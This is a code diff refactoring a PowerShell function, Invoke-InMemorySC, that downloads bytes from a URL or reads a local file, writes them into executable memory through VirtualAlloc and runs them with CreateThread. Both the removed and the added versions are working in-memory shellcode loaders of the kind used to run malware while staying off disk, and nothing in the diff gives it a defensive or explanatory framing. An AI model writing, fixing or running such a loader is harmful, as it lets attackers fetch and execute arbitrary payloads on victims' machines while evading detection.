@@ -1,43 +1,36 @@
 function Invoke-InMemorySC {
     param(
-        [Parameter(Mandatory=$true, Position=0)]
+        [Parameter(Mandatory=$true)]
         [string]$TargetPath
     )
-    
-    # Memory loading technique
-    $memLoad = {
-        param($b)
-        $mDef = @"
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
-        [DllImport("kernel32")]
-        public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);
-        [DllImport("kernel32")]
-        public static extern uint WaitForSingleObject(IntPtr h, uint t);
-"@
-        $k32 = Add-Type -MemberDefinition $mDef -Name 'K32' -Namespace 'Win32' -PassThru
-        
-        $m = $k32::VirtualAlloc([IntPtr]::Zero, [uint]$b.Length, 0x3000, 0x40)
-        [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $m, $b.Length)
-        $h = $k32::CreateThread([IntPtr]::Zero, 0, $m, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-        $k32::WaitForSingleObject($h, [uint32]"0xFFFFFFFF") | Out-Null
-    }
 
-    # Download/load logic
+    $k32Def = @"
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")]
+    public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);
+    [DllImport("kernel32")]
+    public static extern uint WaitForSingleObject(IntPtr h, uint t);
+"@
+
+    $k32 = Add-Type -MemberDefinition $k32Def -Name 'Kernel32' -Namespace 'Win32' -PassThru
+
     try {
-        if ($TargetPath -match '^(http|https)://') {
-            $b = (New-Object Net.WebClient).DownloadData($TargetPath)
+        $b = if ($TargetPath -match '^http') {
+            (New-Object Net.WebClient).DownloadData($TargetPath)
+        } else {
+            [IO.File]::ReadAllBytes($TargetPath)
         }
-        else {
-            $b = [IO.File]::ReadAllBytes($TargetPath)
-        }
-        
-        # Execute in separate scope
-        & $memLoad -b $b
+
+        # Fixed type declaration
+        $mem = $k32::VirtualAlloc([IntPtr]::Zero, [uint32]$b.Length, 0x3000, 0x40)
+        [Runtime.InteropServices.Marshal]::Copy($b, 0, $mem, $b.Length)
+        $thread = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        $k32::WaitForSingleObject($thread, [uint32]::MaxValue) | Out-Null
     }
     finally {
-        # Cleanup
-        Remove-Variable b, memLoad -ErrorAction SilentlyContinue
+        Remove-Variable b, mem, thread -ErrorAction SilentlyContinue
         [GC]::Collect()
     }
 }
+
